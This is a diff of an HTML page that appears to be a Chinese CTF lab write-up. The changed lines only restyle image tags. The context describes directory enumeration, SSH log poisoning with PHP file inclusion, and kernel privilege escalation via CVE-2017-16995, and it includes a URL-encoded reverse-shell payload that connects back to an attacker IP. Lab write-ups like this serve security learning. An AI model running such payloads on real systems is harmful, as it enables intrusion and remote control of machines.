@@ -121,9 +121,9 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 <h2>初步信息枚举</h2>
 <p>先看优先级高的FTP端口，尝试匿名用户登录，失败，挂一个爆破然后看web端口。</p>
 <p>先看80端口，只有一个tomato~~</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f4c02607-0f5f-4c51-9c01-428212efd03e"><img width="1919" height="975" alt="Image" src="https://github.com/user-attachments/assets/f4c02607-0f5f-4c51-9c01-428212efd03e" style="max-width: 100%; height: auto; max-height: 975px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f4c02607-0f5f-4c51-9c01-428212efd03e"><img width="1919" height="975" alt="Image" src="https://github.com/user-attachments/assets/f4c02607-0f5f-4c51-9c01-428212efd03e" style="max-width: 100%; height: auto; max-height: 975px;; aspect-ratio: 1919 / 975; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p>看一下源码，有类似凭据或者提示的代码，存起来，也可以直接cewl扒取页面，制作字典。</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8536122d-854b-4a77-a2ce-6f4cea5a7dfa"><img width="1919" height="627" alt="Image" src="https://github.com/user-attachments/assets/8536122d-854b-4a77-a2ce-6f4cea5a7dfa" style="max-width: 100%; height: auto; max-height: 627px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8536122d-854b-4a77-a2ce-6f4cea5a7dfa"><img width="1919" height="627" alt="Image" src="https://github.com/user-attachments/assets/8536122d-854b-4a77-a2ce-6f4cea5a7dfa" style="max-width: 100%; height: auto; max-height: 627px;; aspect-ratio: 1919 / 627; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p>爆破一下目录，啥也没有。那就看8888端口的web服务。需要验证拿刚刚的字典没有爆出来，自己的字典也没爆出来，目录也扫不到。然后卡死了...</p>
 <p>一直卡卡卡卡卡卡卡卡，实在没招了搜一下wp，第一眼就看到是web的入口，但是web啥也没有啊，我感觉的目录字典的问题，然后我换字典扫</p>
 <pre class="notranslate"><code class="notranslate">└─$ dirsearch -u http://192.168.218.217/ -w /usr/share/wordlists/dirb/common.txt
@@ -146,11 +146,11 @@ Target: http://192.168.218.217/
 Task Completed
 </code></pre>
 <p>真有新货，果然是字典的问题。</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/a462d859-6088-4032-a148-d11998b0e826"><img width="1919" height="963" alt="Image" src="https://github.com/user-attachments/assets/a462d859-6088-4032-a148-d11998b0e826" style="max-width: 100%; height: auto; max-height: 963px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/a462d859-6088-4032-a148-d11998b0e826"><img width="1919" height="963" alt="Image" src="https://github.com/user-attachments/assets/a462d859-6088-4032-a148-d11998b0e826" style="max-width: 100%; height: auto; max-height: 963px;; aspect-ratio: 1919 / 963; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p>是一个目录，我习惯性的打开开发者工具翻翻看看，然后翻到phpinfo页面发现了注释</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b2d917af-de59-4820-8f92-3fc5258f5759"><img width="1919" height="937" alt="Image" src="https://github.com/user-attachments/assets/b2d917af-de59-4820-8f92-3fc5258f5759" style="max-width: 100%; height: auto; max-height: 937px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b2d917af-de59-4820-8f92-3fc5258f5759"><img width="1919" height="937" alt="Image" src="https://github.com/user-attachments/assets/b2d917af-de59-4820-8f92-3fc5258f5759" style="max-width: 100%; height: auto; max-height: 937px;; aspect-ratio: 1919 / 937; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p>很直白的提示，可以直接用，没有什么限制</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c84735a0-d967-42fe-b1f6-964509296361"><img width="1919" height="980" alt="Image" src="https://github.com/user-attachments/assets/c84735a0-d967-42fe-b1f6-964509296361" style="max-width: 100%; height: auto; max-height: 980px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c84735a0-d967-42fe-b1f6-964509296361"><img width="1919" height="980" alt="Image" src="https://github.com/user-attachments/assets/c84735a0-d967-42fe-b1f6-964509296361" style="max-width: 100%; height: auto; max-height: 980px;; aspect-ratio: 1919 / 980; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <h1>漏洞利用</h1>
 <p>本来我感觉是让我包含服务目录相关的配置文件，但是始终找不到包含的文件，然后尝试包含一些登录凭据文件，也没成功。后面了解到，ssh的log文件在 <strong>/var/log/auth.log</strong>，然后由于靶机中文件包含是可以执行php代码，所以可以尝试使用一些php代码作为用户名登录ssh，引发报错之后，包含log文件就会导致代码执行。</p>
 <p>我是想直接写反向shell进去的，但是里面包含太多的符号，我怎么转义都过不了，后来发现是ssh版本高了，尝试降，想了一下直接用xshell好像就可以，但是直接打反向shell，不知道是太长了还是什么，代码不会完整的进log文件，最后尝试写一句话木马，发现是可以写进去的 <strong></strong></p>
@@ -158,7 +158,7 @@ Task Completed
 一定记得编码一下，然后多试错，不然会导致被系统反正很多因素过滤，导致payload出错，这是我的<code class="notranslate">http://192.168.218.217/antibot_image/antibots/info.php?image=/var/log/auth.log&amp;cmd=php+-r+%27%24sock%3dfsockopen(%22192.168.218.148%22%2c4444)%3bexec(%22%2fbin%2fsh+-i+%3c%263+%3e%263+2%3e%263%22)%3b%27</code></p>
 <h1>提权</h1>
 <p>拿到shell之后直接上linpeas扫，感觉最大可能就是内核漏洞了，但是靶机中没有编译程序，难度有提升了。</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/92520c5c-dd9f-4e85-922b-a821981db918"><img width="1919" height="718" alt="Image" src="https://github.com/user-attachments/assets/92520c5c-dd9f-4e85-922b-a821981db918" style="max-width: 100%; height: auto; max-height: 718px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/92520c5c-dd9f-4e85-922b-a821981db918"><img width="1919" height="718" alt="Image" src="https://github.com/user-attachments/assets/92520c5c-dd9f-4e85-922b-a821981db918" style="max-width: 100%; height: auto; max-height: 718px;; aspect-ratio: 1919 / 718; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p>优先先跟着linpeas的结果进行内核提权，脏牛给我靶机跑崩了，<strong>[<a title="CVE-2017-16995" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-45mv-5p9c-6w7c/hovercard" href="https://github.com/advisories/GHSA-45mv-5p9c-6w7c">CVE-2017-16995</a>] eBPF_verifier</strong>成功了。</p>
 <p>现在的问题是动态链接到 libc.so.6，而且Kali 上的 glibc 2.34，<br>
 到靶机上运行时，会去找靶机的 /lib/x86_64-linux-gnu/libc.so.6，结果版本太旧导致报错。</p>
